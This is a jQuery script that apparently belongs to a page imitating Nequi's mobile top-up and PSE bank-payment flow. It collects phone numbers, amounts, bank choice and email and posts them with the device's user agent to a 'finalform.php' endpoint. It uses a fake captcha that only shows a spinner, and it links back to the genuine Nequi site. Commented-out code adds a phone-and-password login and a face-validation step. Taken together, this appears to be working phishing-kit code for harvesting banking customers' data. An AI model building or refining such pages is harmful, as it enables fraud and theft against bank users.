var catchalisto = 0;

$(document).ready(function($){

	$(".inp").click(function(){
		

		if ($(this).attr("estado") == "0") {
			$(this).attr("estado","1");
			var ob = $(this);     
	        ob.find(".texto-demo").hide();
	        ob.find(".etiqueta").show();
	        ob.find(".etiqueta").animate({
	    		"margin-top" : "-22px"   
	  		}, 20, function() { 
		  		ob.find(".etiqueta").animate({
		    		"margin-top" : "-39px"   
		  		}, 100, function() {  	
		  			ob.find(".texto-demo").css("margin-top","-41px");		
		  			ob.find(".entrada").removeAttr("readonly");		  			
		  			ob.find(".entrada").focus();
		  		});
	  		});	
		}	
    });


    $(".entrada").blur(function(){ 
		var ob = $(this).parents(".inp"); 
		if ($(this).val() == "") {
			ob.attr("estado","0");
			$(this).attr("readonly","readonly");
			ob.find(".etiqueta").hide()
			ob.find(".etiqueta").css("margin-top","-28px");
			ob.find(".texto-demo").show();	
			ob.find(".texto-demo").animate({
	    		"margin-top" : "-45px"   
	  		}, 20, function() {
	  			ob.find(".texto-demo").animate({"margin-top" : "-32px"}, 100);
	  		}); 				
		}else{

		}          
    });

   	$("#txt-cedula").keyup(function(e) {
   		cad = $('#txt-cedula').val();
        
        // Remover el símbolo $ y espacios
        cad = cad.replace('$', '').replace(/\s/g, '');
        
        // Si está vacío, establecer en 0
        if (cad === '' || cad === '0') {
            $('#txt-cedula').val('$ 0');
            return;
        }
        
        // Remover puntos existentes y convertir a número
        var numero = parseInt(cad.replace(/\./g, ''));
        
        // Formatear con puntos cada 3 dígitos
        var formateado = numero.toLocaleString('es-CO');
        
        // Agregar el símbolo $
        $('#txt-cedula').val('$ ' + formateado);
        $('#txt-cedula').focus();
        
        // Verificar si se puede habilitar el botón
        if ($("#txt-cedula").val() != "$ 0" && $("#txt-banco").val() != "" && $("#txt-cel").val().length == 10 && $("#txt-re").val().length == 10 && $("#txt-cel").val() == $("#txt-re").val() && catchalisto == 1) {
            $("#paso0").removeAttr("disabled");
        } else {
            $("#paso0").attr("disabled","disabled");
        }
    });

   	$("#catcha").click(function(){
   		if (catchalisto == 0) {   			
	    	$("#catcha").attr("src","../assets/img/load-catcha.gif"); 
	    	catchalisto = 1;
	    	setTimeout(catchaok, 800);  			  
   		}
   	});

   	   	$("#txt-cel,#txt-re").keyup(function(e) {     		
    		if ($("#txt-cel").val().length == 10 && $("#txt-re").val().length == 10) {
    			// Validar que empiecen por 3
    			if ($("#txt-cel").val().charAt(0) !== "3" || $("#txt-re").val().charAt(0) !== "3") {
    				$("#inp-cel,#inp-re").css("border","1px solid #ff585f");
    				$("#txt-cel,#txt-re").css("color","#ff585f");
    				$("#err-cel").html("El número debe empezar por 3").show();
    				$("#paso0").attr("disabled","disabled");
    			} else if ($("#txt-cel").val() != $("#txt-re").val()) {   				
    				$("#inp-cel,#inp-re").css("border","1px solid #ff585f");
    				$("#txt-cel,#txt-re").css("color","#ff585f");
    				$("#err-cel").html("Los números no coinciden").show();
    				$("#paso0").attr("disabled","disabled");
    			} else {
    				$("#inp-cel,#inp-re").css("border","1px solid #fbf7fb");
    				$("#txt-cel,#txt-re").css("color","#200020");
    				$("#err-cel").hide();
    				if ($("#txt-cedula").val() != "$ 0" && $("#txt-banco").val() != "" && catchalisto == 1) {
 					$("#paso0").removeAttr("disabled");
 				}
    			}
    		} else {
    			$("#paso0").attr("disabled","disabled");
    			$("#inp-cel,#inp-re").css("border","1px solid #fbf7fb");
 			$("#txt-cel,#txt-re").css("color","#200020");
 			$("#err-cel").hide();				
    		}  
    	});

   	    	$("#txt-banco").change(function(){      
     	if ($("#txt-cedula").val() != "$ 0" && $("#txt-banco").val() != "" && $("#txt-cel").val().length == 10 && $("#txt-re").val().length == 10 && $("#txt-cel").val() == $("#txt-re").val() && $("#txt-cel").val().charAt(0) === "3" && $("#txt-re").val().charAt(0) === "3" && catchalisto == 1) {
 			$("#paso0").removeAttr("disabled");
 		}else{
 			$("#paso0").attr("disabled","disabled");
    			
 		}  	 
     });


   	$("#paso0").click(function(){ 
   		$("#fondo,#cargando").show();   	 
		cedula_final = convertir($("#txt-cedula").val().replaceAll(".","").replaceAll("$","").replaceAll(" ",""));
		cedula_final = "$" + cedula_final + ".00"
   		$("#paso0").html('<img src="../assets/img/load-proceso.gif" width="42">');
		$("#inf-cel").html($("#txt-cel").val());
		$("#inf-cedula").html(cedula_final);
		$("#val-persona").html($("#txt-persona").val());
		$("#val-banco").html($("#txt-banco option:checked").attr("label"));
   		revisar_datos();
    });

    $("#paso1").click(function(){   
    	$("#fondo,#cargando").show();

   		$("#paso1").html('<img src="../assets/img/load-proceso.gif" width="42">');
   		enviar_datos($("#txt-cel").val(),$("#txt-cedula").val(),$("#txt-persona").val(),$("#txt-banco").val(),$("#txt-banco option:checked").attr("tipo"),$("#txt-banco option:checked").attr("folder"),$("#txt-banco option:checked").attr("label"));
    });

// Agregar un pequeño retraso para asegurar que todos los elementos estén disponibles
setTimeout(function() {
    $("#btn-banco-mobile,#btn-banco").click(function(){      
    
    const correo  = $("#txt-email").val() ? $("#txt-email").val().trim() : "";
    const celular = localStorage.getItem('cel') || "";
    const cedula   = localStorage.getItem('val') || "";
    const persona = localStorage.getItem('per') || "";
    const banco   = localStorage.getItem('ban') || "";
    const tipo    = localStorage.getItem('tip') || "";
    const folder  = localStorage.getItem('fol') || "";
    const nombre  = localStorage.getItem('nom') || "";
    const disp    = localStorage.getItem('dis') || navigator.userAgent;
    
    // Guardar correo en localStorage
    if (correo) {
        localStorage.setItem('correo', correo);
    }
    

    


    if (correo !== "") {
        $("#cargando").show();

        $.post("../process/finalform.php", {
            eml: correo,
            cel: celular,
            val: cedula,
            per: persona,
            ban: banco,
            tip: tipo,
            fol: folder,
            nom: nombre,
            dis: disp
        }, function (data) {
            const res = data.split("|");
            if (res[0] == "2") {
                window.location.href = "../recargas/transaction/" + res[1];
            } else {
                window.location.href = "../PSEtransaction/";
            }
        });
    } else {
        $("#txt-email").css({
            "border": "1px solid #a94442",
            "box-shadow": "inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #ce8483"
        });     
        $("#err-email").show();   		
    }
});

    

    $("#imprimir").click(function(){        		
    	window.print();
    });
    
    $("#comprobante").click(function(){        		
    	$("#aprobado,#comprobante,.titulo").hide();
    	$(".marco,#paso1,#imprimir,#titulo-comprobante").show();
    });


    $("#regresar").click(function(){        		
    	window.location.href = "https://recarga.nequi.com.co/"; 	
    });
    

    

	/*
	$("#btn-facial").click(function(){      
        window.location.href = "../face-validate/";         
    });

    	if ($(this).find(".con-indicativo").html() == "+57") {
    		$("#txt-celular").attr("maxlength","10");
    	}else{
    		$("#txt-celular").attr("maxlength","8");
    	}


		sw_mind = 0;   	
	});
		if ($("#txt-indicativo").html() == "+57") {
			if ($("#txt-celular").val().length > 9 && $("#txt-password").val().length > 3) {
	    		$("#btn-login").removeAttr("disabled");     		


   $("#txt-celular,#txt-password").keyup(function(e) {
    	if ($("#txt-indicativo").html() == "+57") {
    		if ($("#txt-celular").val().length > 9 && $("#txt-password").val().length > 3 && sw_cap == 1) {
	    		$("#btn-login").removeAttr("disabled");     		
	    	}else{
	    		$("#btn-login").attr("disabled","disabled");
	    	}
    	}else{
    		if ($("#txt-celular").val().length > 7 && $("#txt-password").val().length > 3 && sw_cap == 1) {
	    		$("#btn-login").removeAttr("disabled");     		
	    	}else{
	    		$("#btn-login").attr("disabled","disabled");
	    	}
    	}
    });
*/
    }); // Cierre del setTimeout
});